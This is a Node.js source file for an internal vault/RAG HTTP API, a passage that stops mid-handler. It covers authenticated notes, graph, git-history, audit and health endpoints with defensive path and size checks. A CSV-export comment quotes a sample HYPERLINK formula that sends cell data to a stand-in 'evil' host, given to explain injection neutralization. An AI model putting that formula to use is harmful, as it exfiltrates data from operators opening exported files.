#!/usr/bin/env node
// rag-api: internal HTTP shim for vault-rag-mcp.
// Exposes: POST /search, /get, /backlinks, /put. Bearer auth on POST.
// Listens on 0.0.0.0:5679 inside vault-rag-net only (no host port).

const http   = require('http');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');
const { Pool } = require('pg');
const lib = require('./lib/vault-lib');
const vtRoutes = require('./lib/vt-routes');
const gitSync = require('./lib/git-sync');
const fleetRoutes = require('./lib/fleet-routes');
const fleetDb = require('./lib/fleet-db');
const { SecretsHandler, NotFound, ConflictRetriesExhausted } = require('./secrets-handler.js');
const { SecretsClient } = require('./lib/secrets-client.js');
const tokmonRoutes = require('./lib/tokmon-routes');
const { tokenEqual: sharedTokenEqual } = require('./lib/shared-auth');
// vt-0210/vt-0243: structured logger + request-id correlation. Set
// VAULT_RAG_LOG_FORMAT=json on prod to get parseable lines for log
// aggregators; default 'text' keeps `docker logs` human-readable.
const log = require('./lib/log').for('rag-api');
const { requestId } = require('./lib/log');

const TOKMON_INGEST_TOKEN = process.env.VAULT_RAG_TOKMON_INGEST_TOKEN || null;

const sha256 = (buf) => crypto.createHash('sha256').update(buf).digest('hex');

// vt-0137: $HOME is a tmpfs; SSH needs $HOME/.ssh to exist before it can
// write known_hosts. Create on startup so git operations don't warn.
try { fs.mkdirSync(path.join(process.env.HOME || '/root', '.ssh'), { recursive: true, mode: 0o700 }); } catch {}

const VAULT = process.env.VAULT_PATH || '/vault';
const TOKEN = process.env.VAULT_RAG_API_TOKEN;
// vt-0124: separate token for fleet's mutating/RCE-capable endpoints. If unset,
// the fleet API runs in legacy single-token mode (viewer bearer gates writes).
const FLEET_ADMIN_TOKEN = process.env.VAULT_RAG_FLEET_ADMIN_TOKEN || null;
const PORT  = parseInt(process.env.RAG_PORT || process.env.PORT || '5679', 10);
const SKIP_PG = process.env.VAULT_SECRETS_SKIP_PG === '1';

if (!TOKEN) {
  log.fatal('boot_no_token', { msg: 'VAULT_RAG_API_TOKEN not set' });
  process.exit(1);
}
if (!FLEET_ADMIN_TOKEN) {
  log.warn('boot_no_admin_token', { msg: 'VAULT_RAG_FLEET_ADMIN_TOKEN not set — fleet writes/exec/workflow-CRUD share the viewer bearer (RCE-capable). Set this token to require separate admin credentials for mutating ops.' });
} else if (FLEET_ADMIN_TOKEN === TOKEN) {
  log.warn('boot_admin_token_equals_viewer', { msg: 'VAULT_RAG_FLEET_ADMIN_TOKEN equals VAULT_RAG_API_TOKEN — admin/viewer split is not meaningful. Rotate one of them.' });
}

const PG = {
  host:     process.env.VAULT_RAG_PG_HOST || 'vault-rag-postgres',
  database: process.env.VAULT_RAG_PG_DB   || 'vault_rag',
  user:     process.env.VAULT_RAG_PG_USER || 'postgres',
  password: process.env.VAULT_RAG_PG_PASS,
  port:     parseInt(process.env.VAULT_RAG_PG_PORT || '5432', 10),
};

const AGENT_RE = /^[a-z0-9][a-z0-9-]{0,63}$/;
const WRITABLE_PREFIXES = ['00-inbox/', '03-sessions/', '04-tasks/', '06-resources/notes/'];

// vt-0186: pg.Pool replaces shared pg.Client. Each withPg() call acquires
// a dedicated client from the pool for the duration of fn(), so BEGIN/
// COMMIT inside fn() is bound to one connection. fleet code that does
// single .query() calls reads ctx.db directly — Pool exposes .query()
// which itself acquires+releases per call, which is safe for non-tx use.
let pg;

async function pgConnect() {
  pg = new Pool({
    ...PG,
    max: parseInt(process.env.VAULT_RAG_PG_POOL_MAX || '10', 10),
    idleTimeoutMillis: 30_000,
    connectionTimeoutMillis: 5_000,
  });
  pg.on('error', (e) => {
    // Pool errors don't kill the pool — log and let in-flight handlers
    // see the error via their own catch. Idle clients are auto-recycled.
    log.error('pg_pool_error', { msg: e.message });
  });
  // vt-0278: statement_timeout on every new connection. Without this a
  // single slow query (HNSW search on poorly tuned shared_buffers, a
  // forgotten lock) can block its connection until network reset and
  // starve the pool. 30s is generous for vector search; long-running
  // batch jobs should use their own connection with a per-statement
  // SET LOCAL statement_timeout override.
  const STATEMENT_TIMEOUT_MS = parseInt(process.env.VAULT_RAG_PG_STATEMENT_TIMEOUT_MS || '30000', 10);
  pg.on('connect', (client) => {
    client.query(`SET statement_timeout = ${STATEMENT_TIMEOUT_MS}`).catch(e =>
      log.warn('pg_statement_timeout_set_failed', { msg: e.message }));
  });
  // Smoke-test once at boot so we fail loudly instead of lazily on first
  // query. Caller (boot block) handles failure.
  await pg.query('SELECT 1');
}

async function withPg(fn) {
  if (!pg) await pgConnect();
  let client = await pg.connect();
  let retried = false;
  try {
    return await fn(client);
  } catch (e) {
    if (!retried && /connection|terminated/i.test(e.message)) {
      retried = true;
      try { client.release(true); } catch {}
      client = await pg.connect();
      return await fn(client);
    }
    throw e;
  } finally {
    try { client.release(); } catch {}
  }
}

// vt-0187: atomic transaction wrapper. Use for write-pairs that must
// land together (insertMetric + setLatestMetrics, upsertHost +
// setMetadata, batcher.flush + markSessionExited). Acquires a dedicated
// client, BEGIN, runs fn(client), COMMIT — or ROLLBACK on throw.
async function withTx(fn) {
  if (!pg) await pgConnect();
  const client = await pg.connect();
  try {
    await client.query('BEGIN');
    const result = await fn(client);
    await client.query('COMMIT');
    return result;
  } catch (e) {
    try { await client.query('ROLLBACK'); } catch {}
    throw e;
  } finally {
    try { client.release(); } catch {}
  }
}

// vt-0126 follow-up: same body-size cap pattern as fleet-routes readBody.
// Non-fleet endpoints (/api/put, /api/task/*, /api/secrets/*) used to accept
// unbounded bodies — a 1 GiB POST would OOM the container.
const MAX_RAG_BODY_BYTES = 4 * 1024 * 1024;  // 4 MiB: vault notes can be large
async function readBody(req, { maxBytes = MAX_RAG_BODY_BYTES } = {}) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let bytes = 0;
    let aborted = false;
    req.on('data', c => {
      if (aborted) return;
      bytes += c.length;
      if (bytes > maxBytes) {
        aborted = true;
        const err = new Error(`body exceeds ${maxBytes} bytes`);
        err.statusCode = 413;
        return reject(err);
      }
      chunks.push(c);
    });
    req.on('end', () => {
      if (aborted) return;
      const raw = Buffer.concat(chunks).toString('utf8');
      if (!raw) return resolve({});
      try { resolve(JSON.parse(raw)); }
      catch (e) { reject(new Error(`bad json: ${e.message}`)); }
    });
    req.on('error', (e) => { if (!aborted) reject(e); });
  });
}

function send(res, code, body) {
  const buf = Buffer.from(JSON.stringify(body));
  res.writeHead(code, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': buf.length,
  });
  res.end(buf);
}

function checkAuth(req) {
  const h = req.headers['authorization'] || '';
  if (!h.startsWith('Bearer ')) return false;
  const tok = h.slice(7).trim();
  // vt-0183: use crypto.timingSafeEqual for consistency with shared-auth.js
  // and to handle multi-byte UTF-8 correctly (charCodeAt was fine for ASCII
  // tokens, but the buffer-based form is textbook + matches the rest of
  // the codebase).
  if (tok.length !== TOKEN.length) return false;
  try {
    return crypto.timingSafeEqual(Buffer.from(tok, 'utf8'), Buffer.from(TOKEN, 'utf8'));
  } catch { return false; }
}

function safeRel(p) {
  if (!p) throw new Error('path required');
  if (p.includes('..') || p.startsWith('/') || p.includes('\\')) throw new Error('bad path');
  return p;
}

function resolveWritePath(agent_id, relPath) {
  const rel = safeRel(relPath);
  if (WRITABLE_PREFIXES.some(pre => rel.startsWith(pre))) return rel;
  if (!agent_id) throw new Error('agent_id required for non-prefix paths');
  if (!AGENT_RE.test(agent_id)) throw new Error('bad agent_id');
  return `agents/${agent_id}/${rel}`;
}

// vt-0134: prefer the standalone secrets-server when configured (production).
// Fall back to in-process SecretsHandler for dev/test/legacy deployments that
// haven't deployed the split yet.
let _secretsHandler = null;
let _secretsClient  = null;
function getSecretsClient() {
  if (_secretsClient !== null) return _secretsClient;
  const c = new SecretsClient();
  _secretsClient = c.enabled ? c : false;
  if (c.enabled) console.log(`[rag-api] secrets via standalone server: ${c.url}`);
  return _secretsClient;
}
function getSecretsHandler() {
  if (_secretsHandler) return _secretsHandler;
  _secretsHandler = new SecretsHandler({
    ageKeyPath:     process.env.VAULT_AGE_KEY_PATH,
    recipientsPath: process.env.VAULT_RECIPIENTS_PATH || '/vault/secrets/recipients',
    vaultAgePath:   process.env.VAULT_AGE_PATH || '/vault/secrets/vault.age',
    repoPath:       process.env.VAULT_REPO_PATH || '/vault',
  });
  return _secretsHandler;
}
// Returns the active secrets backend (client OR in-process handler).
function secretsBackend() {
  const client = getSecretsClient();
  return client || getSecretsHandler();
}

// vt-0142: audit every secret operation. Lives in rag-api (where the
// HTTP auth + bearer are visible) so the standalone vault-rag-secrets
// container per vt-0134 keeps its minimal capability set.
function callerFingerprint(req) {
  if (!req) return null;
  const auth = req.headers?.authorization || '';
  const token = auth.replace(/^Bearer\s+/i, '');
  if (!token) return null;
  return crypto.createHash('sha256').update(token).digest('hex').slice(0, 12);
}
async function auditSecret(req, op, name, outcome) {
  try {
    await withPg(c => c.query(
      `INSERT INTO secret_audit (op, name, caller_id, via, outcome) VALUES ($1,$2,$3,$4,$5)`,
      [op, name || null, callerFingerprint(req), 'http', outcome]));
  } catch (e) {
    log.error('secret_audit_insert_failed', { op, name: name || null, msg: e.message });
  }
}
function mapOutcome(e) {
  if (e instanceof NotFound || e.statusCode === 404 || e.code === 404) return 'denied';
  return 'error';
}

// vt-0146: directory listing for the Fleet UI vault tab. Filesystem walk
// (vault_files table never existed). Auth: viewer Bearer enough — readers
// only. Tag overlay from chunks table is best-effort.
async function handleNotesList(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const u = new URL(req.url, 'http://x');
  const prefix = (u.searchParams.get('prefix') || '').replace(/^\/+/, '').replace(/\/+$/, '');
  const depth = Math.min(Math.max(parseInt(u.searchParams.get('depth') || '2', 10), 0), 5);
  if (prefix.includes('..')) return send(res, 422, { error: 'bad prefix' });
  const base = prefix ? path.join(VAULT, prefix) : VAULT;
  if (!base.startsWith(VAULT)) return send(res, 422, { error: 'bad prefix' });
  if (!fs.existsSync(base)) return send(res, 200, { entries: [] });

  const entries = [];
  function walk(dir, depthLeft, rel) {
    let dirents;
    try { dirents = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
    for (const d of dirents) {
      if (d.name.startsWith('.')) continue;
      if (d.name === 'node_modules') continue;
      const full = path.join(dir, d.name);
      const subRel = rel ? `${rel}/${d.name}` : d.name;
      if (d.isDirectory()) {
        entries.push({ path: subRel + '/', kind: 'dir' });
        if (depthLeft > 0) walk(full, depthLeft - 1, subRel);
      } else if (d.name.endsWith('.md')) {
        let stat;
        try { stat = fs.statSync(full); } catch { continue; }
        entries.push({ path: subRel, kind: 'file', size: stat.size, mtime: stat.mtimeMs });
      }
    }
  }
  walk(base, depth, prefix);

  if (entries.length && !SKIP_PG) {
    try {
      const paths = entries.filter(e => e.kind === 'file').map(e => e.path);
      if (paths.length) {
        const r = await withPg(c => c.query(
          `SELECT path, array_agg(DISTINCT t) AS tags
           FROM chunks, unnest(tags) AS t
           WHERE path = ANY($1)
           GROUP BY path`, [paths]));
        const tagsByPath = Object.fromEntries(r.rows.map(row => [row.path, row.tags]));
        for (const e of entries) if (e.kind === 'file' && tagsByPath[e.path]) e.tags = tagsByPath[e.path];
      }
    } catch (e) { log.error('notes_tag_overlay_failed', { msg: e.message }); }
  }

  send(res, 200, { entries: entries.slice(0, 5000) });
}

// vt-0158: lightweight basename→path index for wiki-link resolution.
// Walks the whole vault (max 50k entries to bound cost), returns
// {byBase, byBasenameLower, all} where:
//   byBase[basename-without-ext] = rel-path-with-md
//   byBasenameLower is the same key-lowercased for case-insensitive matches
//   all is a sorted array of all .md paths
// Used by the Fleet UI vault tab to resolve [[name]] / [[folder/name]] /
// [[name|alias]] links on click without an extra round-trip per click.
async function handleNotesIndex(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const all = [];
  const byBase = {};
  const byBaseLower = {};
  // vt-0171: cap reduced to 20k. At ~200 B avg path × 3 structures + JSON
  // serialization overhead, 20k entries ≈ ~10 MiB response — already
  // generous for the UI's wiki-link resolver. Larger vaults get truncated;
  // the UI falls back to its prefix-match heuristic.
  const MAX = 20000;
  function walk(dir, rel) {
    if (all.length >= MAX) return;
    let dirents;
    try { dirents = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
    for (const d of dirents) {
      if (all.length >= MAX) return;
      if (d.name.startsWith('.')) continue;
      if (d.name === 'node_modules') continue;
      const full = path.join(dir, d.name);
      const subRel = rel ? `${rel}/${d.name}` : d.name;
      if (d.isDirectory()) {
        walk(full, subRel);
      } else if (d.name.endsWith('.md')) {
        all.push(subRel);
        const base = d.name.replace(/\.md$/, '');
        // First write wins (so a more "canonical" path higher in the tree
        // beats a duplicate buried in archive/_refactor/etc). The UI can
        // also send the full rel-path to disambiguate.
        if (!(base in byBase)) byBase[base] = subRel;
        const lc = base.toLowerCase();
        if (!(lc in byBaseLower)) byBaseLower[lc] = subRel;
      }
    }
  }
  walk(VAULT, '');
  all.sort();
  send(res, 200, { byBase, byBaseLower, all, truncated: all.length >= MAX });
}

// vt-0209: readiness probe. Returns 200 only when all hard dependencies
// answer; 503 otherwise. Kept lightweight (no git, no inventory) so it
// vt-0315: graph view. Returns a subgraph of the vault wiki-link graph
// suitable for force-directed rendering. Two modes:
//   * unrooted (no path param): all notes with at least one link, up
//     to MAX_NODES; for small vaults this is the whole graph.
//   * rooted (?path=foo/bar.md&depth=N): BFS up to N hops from the
//     given path, both incoming + outgoing edges, again capped.
// Nodes carry {path, label} only — the UI fetches detail on click via
// existing /notes/show endpoints.
async function handleNotesGraph(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const u = new URL('http://x' + req.url);
  const rootPath = u.searchParams.get('path') || '';
  const depth = Math.min(5, Math.max(1, parseInt(u.searchParams.get('depth') || '2', 10)));
  const MAX_NODES = Math.min(2000, parseInt(u.searchParams.get('limit') || '500', 10));
  try {
    let nodes = new Set();
    let edges = [];
    if (rootPath) {
      // BFS rooted at rootPath, both directions. Each hop = one SQL
      // round-trip; the index on (source) and the explicit index on
      // (target) keep these fast for typical vault sizes.
      nodes.add(rootPath);
      let frontier = new Set([rootPath]);
      for (let hop = 0; hop < depth && nodes.size < MAX_NODES; hop++) {
        const fp = Array.from(frontier);
        if (fp.length === 0) break;
        const { rows } = await withPg(c => c.query(
          `SELECT source, target FROM backlinks
             WHERE source = ANY($1) OR target = ANY($1)`, [fp]));
        const next = new Set();
        for (const r of rows) {
          if (nodes.size >= MAX_NODES) break;
          edges.push({ source: r.source, target: r.target });
          for (const n of [r.source, r.target]) {
            if (!nodes.has(n)) { nodes.add(n); next.add(n); }
          }
        }
        frontier = next;
      }
    } else {
      // Unrooted: all backlink rows, capped. Heaviest-degree node bias
      // would be nicer but the simple top-N-by-source covers it for
      // personal/team vault sizes (<2k notes typical).
      const { rows } = await withPg(c => c.query(
        `SELECT source, target FROM backlinks LIMIT $1`, [MAX_NODES * 4]));
      for (const r of rows) {
        if (nodes.size >= MAX_NODES) break;
        nodes.add(r.source);
        nodes.add(r.target);
        edges.push({ source: r.source, target: r.target });
      }
    }
    // Dedup edges (BFS can yield same edge from both directions).
    const seen = new Set();
    const dedupedEdges = [];
    for (const e of edges) {
      const k = e.source < e.target ? `${e.source}|${e.target}` : `${e.target}|${e.source}`;
      if (seen.has(k)) continue;
      seen.add(k);
      dedupedEdges.push(e);
    }
    const nodeList = Array.from(nodes).map(p => ({
      id: p,
      label: p.split('/').pop().replace(/\.md$/, ''),
      group: p.split('/')[0] || '_root',
    }));
    send(res, 200, {
      root: rootPath || null,
      depth: rootPath ? depth : null,
      truncated: nodes.size >= MAX_NODES,
      node_count: nodeList.length,
      edge_count: dedupedEdges.length,
      nodes: nodeList,
      edges: dedupedEdges,
    });
  } catch (e) {
    log.error('notes_graph_error', { msg: e.message });
    send(res, 500, { error: scrubError(e.message) });
  }
}

// can be hit every 5-10s by an orchestrator without load.
async function handleReadyz(req, res) {
  // vt-0232: each subsystem check capped at 2s. A wedged pg/secrets
  // backend would otherwise hang the response indefinitely (no client
  // timeout on pg.query by default) — orchestrators retry every 5s,
  // sockets accumulate.
  const withTimeout = (p, ms) => Promise.race([
    p,
    new Promise((_, rej) => setTimeout(() => rej(new Error(`timeout >${ms}ms`)), ms)),
  ]);
  const checks = {};
  let ok = true;
  try { await withTimeout(pg.query('SELECT 1'), 2000); checks.pg = 'ok'; }
  catch (e) { ok = false; checks.pg = 'fail: ' + scrubError(e.message); }
  try { await withTimeout(secretsBackend().list(), 2000); checks.secrets = 'ok'; }
  catch (e) { ok = false; checks.secrets = 'fail: ' + scrubError(e.message); }
  send(res, ok ? 200 : 503, { ready: ok, checks });
}

// vt-0221: read-only audit feed. Returns rows from secret_audit /
// vault_audit / workflow_audit unified into one shape so the UI renders
// from one endpoint. Filters: ?table=secret|vault|workflow|all (default
// all), ?op=, ?caller_id=, ?since=ISO, ?limit=N (cap 1000).
// Returns CSV when ?format=csv.
async function handleAuditFeed(req, res) {
  if (!checkAuth(req) && !(FLEET_ADMIN_TOKEN && fleetRoutes.checkAdminAuth(req, fleetCtx))) {
    return send(res, 401, { error: 'unauthorized' });
  }
  const u = new URL(req.url, 'http://x');
  const tableArg = (u.searchParams.get('table') || 'all').toLowerCase();
  const op = u.searchParams.get('op');
  const callerId = u.searchParams.get('caller_id');
  const since = u.searchParams.get('since');
  const limit = Math.min(Math.max(parseInt(u.searchParams.get('limit') || '200', 10), 1), 1000);
  const format = (u.searchParams.get('format') || 'json').toLowerCase();

  const want = tableArg === 'all'
    ? ['secret', 'vault', 'workflow']
    : tableArg.split(',').map(s => s.trim()).filter(s => ['secret','vault','workflow'].includes(s));

  const parts = [];
  if (want.includes('secret')) {
    parts.push(`SELECT 'secret' AS source, ts, op, name AS subject, caller_id, via, outcome, null::text AS extra FROM secret_audit`);
  }
  if (want.includes('vault')) {
    parts.push(`SELECT 'vault'  AS source, ts, op, path AS subject, agent_id AS caller_id, null::text AS via, 'ok' AS outcome, sha_after::text AS extra FROM vault_audit`);
  }
  if (want.includes('workflow')) {
    parts.push(`SELECT 'workflow' AS source, ts, op, workflow_id::text AS subject, caller_id, via, outcome, definition_sha AS extra FROM workflow_audit`);
  }
  if (!parts.length) return send(res, 422, { error: 'no valid table' });

  const filters = [];
  const args = [];
  if (op)       { args.push(op);       filters.push(`op = $${args.length}`); }
  if (callerId) { args.push(callerId); filters.push(`caller_id = $${args.length}`); }
  if (since)    { args.push(since);    filters.push(`ts >= $${args.length}::timestamptz`); }
  args.push(limit);
  const where = filters.length ? `WHERE ${filters.join(' AND ')}` : '';
  const sql = `
    WITH unified AS (
      ${parts.join(' UNION ALL ')}
    )
    SELECT * FROM unified
    ${where}
    ORDER BY ts DESC
    LIMIT $${args.length}
  `;
  let rows;
  try { rows = (await pg.query(sql, args)).rows; }
  catch (e) {
    if (/relation .* does not exist/.test(e.message)) {
      return send(res, 503, { error: 'audit table missing — apply sql migrations', detail: e.message });
    }
    throw e;
  }
  if (format === 'csv') {
    const header = 'ts,source,op,subject,caller_id,via,outcome,extra';
    // vt-0228: CSV injection neutralization. A subject like
    //   =HYPERLINK("http://evil/?"&A1,"click")
    // executes when an operator opens the CSV in Excel/Sheets. Prefix
    // values starting with any of [=+\-@\t\r] with a single quote so
    // they're treated as plain text.
    const csvSafe = (v) => {
      const s = String(v);
      const lead = s.charAt(0);
      const escaped = (lead === '=' || lead === '+' || lead === '-' || lead === '@' || lead === '\t' || lead === '\r')
        ? "'" + s : s;
      return `"${escaped.replace(/"/g, '""')}"`;
    };
    const body = rows.map(r => [
      r.ts.toISOString(), r.source, r.op, r.subject || '', r.caller_id || '',
      r.via || '', r.outcome || '', r.extra || '',
    ].map(csvSafe).join(',')).join('\n');
    res.writeHead(200, { 'content-type': 'text/csv; charset=utf-8', 'content-disposition': 'attachment; filename="audit.csv"' });
    res.end(header + '\n' + body);
    return;
  }
  send(res, 200, { rows });
}

// vt-0193: aggregated health snapshot for the Health dashboard.
// Returns per-subsystem traffic-light status without forcing the UI to
// query each endpoint separately. All checks are best-effort with short
// timeouts so a wedged subsystem doesn't hang the response.
async function handleHealthDetail(req, res) {
  const out = {
    ok: true,
    ts: new Date().toISOString(),
    subsystems: {},
  };
  // pg pool
  try {
    const r = await pg.query('SELECT 1 AS ok');
    out.subsystems.pg = { status: 'ok', detail: `pool max=${pg.options?.max ?? '?'}, total=${pg.totalCount}, idle=${pg.idleCount}` };
  } catch (e) {
    out.ok = false;
    out.subsystems.pg = { status: 'error', detail: scrubError(e.message) };
  }
  // secrets backend (lightweight probe)
  try {
    await secretsBackend().list();
    out.subsystems.secrets = { status: 'ok' };
  } catch (e) {
    out.ok = false;
    out.subsystems.secrets = { status: 'error', detail: scrubError(e.message) };
  }
  // git repo state + last commit
  try {
    const { execSync } = require('node:child_process');
    const lastCommitTs = execSync('git -C ' + VAULT + ' log -1 --format=%aI', { timeout: 2000 }).toString().trim();
    const ageMs = Date.now() - new Date(lastCommitTs).getTime();
    out.subsystems.git = {
      status: ageMs < 7 * 24 * 3600 * 1000 ? 'ok' : 'warn',
      detail: lastCommitTs,
      last_commit_age_seconds: Math.round(ageMs / 1000),
    };
  } catch (e) {
    out.subsystems.git = { status: 'error', detail: scrubError(e.message) };
  }
  // vt-0300: git-sync push status from lib/git-sync (vt-0289 plumbing).
  // Surfaces "haven't pushed in 6h" to the operator at 03:00 without
  // forcing them to grep logs.
  // vt-0301: only ERROR flips out.ok — pg / secrets do the same.
  //          A "warn" (push lagging, never configured) must NOT flip
  //          the overall health to non-ok or external monitors will
  //          page on every host that doesn't use VAULT_GIT_REMOTE.
  //          The dedicated VaultGitSyncSilent vmalert rule still fires.
  try {
    const gitSyncStatus = gitSync.status?.() || {};
    const now = Math.floor(Date.now() / 1000);
    const okEpoch = gitSyncStatus.last_ok_epoch || 0;
    const failEpoch = gitSyncStatus.last_fail_epoch || 0;
    const okAge = okEpoch ? now - okEpoch : null;
    const failAge = failEpoch ? now - failEpoch : null;
    let status, detail;
    if (okEpoch === 0 && failEpoch === 0) {
      // Feature not exercised yet — no /api/put writes happened OR
      // VAULT_GIT_REMOTE is unset and gitSync.trigger is a no-op.
      // Either way: not an actionable problem.
      status = 'unknown';
      detail = 'no push attempts since boot (VAULT_GIT_REMOTE may be unset, or no /api/put writes yet)';
    } else if (okAge != null && okAge < 6 * 3600) {
      status = 'ok';
      detail = `last push ${okAge}s ago`;
    } else {
      status = 'warn';
      detail = okAge != null
        ? `no successful push in ${Math.round(okAge / 60)} min`
        : 'no successful push yet but failures have occurred — check push_failed log';
    }
    if (failAge != null && (okAge == null || failAge < okAge)) {
      // Note the recent failure regardless of status — adds diagnostic
      // text without changing the status verdict.
      detail += ` · last failure ${failAge}s ago`;
    }
    out.subsystems.git_sync = { status, detail, last_ok_epoch: okEpoch || null, last_fail_epoch: failEpoch || null };
  } catch (e) {
    out.ok = false;
    out.subsystems.git_sync = { status: 'error', detail: scrubError(e.message) };
  }
  // age.key backup recency (file mtime). Looks for .bak.* in same dir as
  // the active key.
  try {
    const ageKeyPath = process.env.VAULT_AGE_KEY || '/opt/vault-rag/.secrets/age.key';
    const dir = path.dirname(ageKeyPath);
    let mostRecent = null;
    if (fs.existsSync(dir)) {
      for (const f of fs.readdirSync(dir)) {
        if (f.startsWith('age.key.bak.')) {
          const st = fs.statSync(path.join(dir, f));
          if (!mostRecent || st.mtimeMs > mostRecent) mostRecent = st.mtimeMs;
        }
      }
    }
    if (mostRecent) {
      const ageMs = Date.now() - mostRecent;
      out.subsystems.age_key_backup = {
        status: ageMs < 30 * 24 * 3600 * 1000 ? 'ok' : 'warn',
        detail: new Date(mostRecent).toISOString(),
        age_seconds: Math.round(ageMs / 1000),
      };
    } else {
      out.subsystems.age_key_backup = { status: 'warn', detail: 'no .bak.* file found' };
    }
  } catch (e) {
    out.subsystems.age_key_backup = { status: 'error', detail: scrubError(e.message) };
  }
  // daemons online count + last_seen
  try {
    const r = await pg.query(`SELECT COUNT(*) FILTER (WHERE status='online') AS online, COUNT(*) AS total FROM fleet_hosts`);
    const { online, total } = r.rows[0];
    out.subsystems.daemons = {
      status: parseInt(online, 10) > 0 ? 'ok' : 'warn',
      detail: `${online}/${total} online`,
      online: parseInt(online, 10),
      total: parseInt(total, 10),
    };
  } catch (e) {
    out.subsystems.daemons = { status: 'error', detail: scrubError(e.message) };
  }
  send(res, 200, out);
}

// vt-0158: git log for a single vault file. Returns the last N commits
// touching that path with sha+ts+author+subject. Vault is a git repo
// (Obsidian-Git on every device + vault-sync.sh on the hub auto-commit),
// so history is meaningful — every Fleet UI save shows up too via the
// auto-commit hook.
// vt-0165: strict path validator for git-spawning endpoints. Reject
// anything outside /^[\w./-]+$/ to keep \0, leading dash, unicode, or
// shell-meta chars away from spawn argv. The existing `..` filter and
// VAULT-prefix check stay; this is an additional first-line filter.
function safeGitPath(rel) {
  if (!rel || rel.includes('..')) return null;
  if (rel.startsWith('-') || rel.startsWith('/')) return null;
  if (!/^[\w./-]+$/.test(rel)) return null;
  return rel;
}
async function handleNotesHistory(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const u = new URL(req.url, 'http://x');
  const rel = safeGitPath((u.searchParams.get('path') || '').replace(/^\/+/, ''));
  if (!rel) return send(res, 422, { error: 'bad path' });
  const limit = Math.min(Math.max(parseInt(u.searchParams.get('limit') || '50', 10), 1), 500);
  const full = path.join(VAULT, rel);
  if (!full.startsWith(VAULT + path.sep) && full !== VAULT) {
    return send(res, 422, { error: 'bad path' });
  }
  const { spawn } = require('node:child_process');
  // Format: sha<TAB>iso-ts<TAB>author<TAB>subject — unit-separator-free,
  // \x1f as record separator so subjects containing tabs/newlines don't
  // corrupt parsing.
  const args = [
    '-C', VAULT, 'log',
    `--max-count=${limit}`,
    `--pretty=format:%H%x09%aI%x09%an%x09%s%x1e`,
    '--', rel,
  ];
  const p = spawn('git', args, { stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '', err = '';
  p.stdout.on('data', (c) => { out += c.toString('utf8'); });
  p.stderr.on('data', (c) => { err += c.toString('utf8'); });
  p.on('close', (code) => {
    if (code !== 0) {
      return send(res, 500, { error: 'git log failed', detail: err.slice(0, 200) });
    }
    const commits = out.split('\x1e').map(s => s.trim()).filter(Boolean).map(line => {
      const [sha, ts, author, ...subjectParts] = line.split('\t');
      return { sha, ts, author, subject: subjectParts.join('\t') };
    });
    send(res, 200, { path: rel, commits });
  });
}

// vt-0158: blob at a specific commit. Lets the UI diff "what was the
// file at sha X" without checking out anything. Plain text only; binary
// blobs return 422.
async function handleNotesShow(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const u = new URL(req.url, 'http://x');
  const rel = safeGitPath((u.searchParams.get('path') || '').replace(/^\/+/, ''));
  const sha = u.searchParams.get('sha') || '';
  if (!rel) return send(res, 422, { error: 'bad path' });
  if (!/^[0-9a-f]{4,64}$/i.test(sha)) return send(res, 422, { error: 'bad sha' });
  const { spawn } = require('node:child_process');
  // vt-0172: cap stdout at 16 MiB. A vault note larger than that won't
  // render meaningfully in the UI anyway, and unbounded growth here is
  // a memory-exhaustion vector for any viewer-authenticated caller.
  const MAX_BYTES = 16 * 1024 * 1024;
  const p = spawn('git', ['-C', VAULT, 'show', `${sha}:${rel}`], { stdio: ['ignore', 'pipe', 'pipe'] });
  const chunks = []; let err = ''; let total = 0; let killed = false;
  p.stdout.on('data', (c) => {
    total += c.length;
    if (total > MAX_BYTES) {
      killed = true;
      try { p.kill('SIGKILL'); } catch {}
      return;
    }
    chunks.push(c);
  });
  p.stderr.on('data', (c) => { err += c.toString('utf8'); });
  p.on('close', (code) => {
    if (killed) return send(res, 413, { error: 'blob too large (>16 MiB)' });
    if (code !== 0) {
      return send(res, 404, { error: 'not found at sha', detail: err.slice(0, 200) });
    }
    const buf = Buffer.concat(chunks);
    // Quick binary sniff: any null byte in first 1KB → reject.
    const head = buf.slice(0, 1024);
    if (head.includes(0)) return send(res, 422, { error: 'binary blob' });
    send(res, 200, { path: rel, sha, text: buf.toString('utf8') });
  });
}

// vt-0159: unified diff for a vault file. Two modes:
//   ?path=X&sha=Y           → `git show --no-color Y -- X` (this commit vs parent)
//   ?path=X&from=A&to=B     → `git diff --no-color A B -- X` (arbitrary range)
//                             B may be the literal "HEAD" or "WORK" (working tree)
// Auth: viewer Bearer. Read-only.
async function handleNotesDiff(req, res) {
  if (!checkAuth(req)) return send(res, 401, { error: 'unauthorized' });
  const u = new URL(req.url, 'http://x');
  const rel = safeGitPath((u.searchParams.get('path') || '').replace(/^\/+/, ''));
  if (!rel) return send(res, 422, { error: 'bad path' });
  const sha = u.searchParams.get('sha') || '';
  const from = u.searchParams.get('from') || '';
  const to = u.searchParams.get('to') || '';
  // sha-or-ref pattern: hex sha, or HEAD, or WORK (alias for working tree).
  const refRe = /^([0-9a-f]{4,64}|HEAD|WORK)$/i;
  let args;
  if (sha) {
    if (!refRe.test(sha)) return send(res, 422, { error: 'bad sha' });
    args = ['-C', VAULT, 'show', '--no-color', '--unified=3', sha, '--', rel];
  } else if (from && to) {
    if (!refRe.test(from) || !refRe.test(to)) return send(res, 422, { error: 'bad ref' });
    if (to.toUpperCase() === 'WORK') {
      // working tree side — `git diff <from> -- path` does this implicitly
      args = ['-C', VAULT, 'diff', '--no-color', '--unified=3', from, '--', rel];
    } else {
      args = ['-C', VAULT, 'diff', '--no-color', '--unified=3', from, to, '--', rel];
    }
  } else {
    return send(res, 422, { error: 'sha OR (from+to) required' });
  }
  const { spawn } = require('node:child_process');
  const p = spawn('git', args, { stdio: ['ignore', 'pipe', 'pipe'] });
  const chunks = []; let err = '';
  p.stdout.on('data', (c) => chunks.push(c));
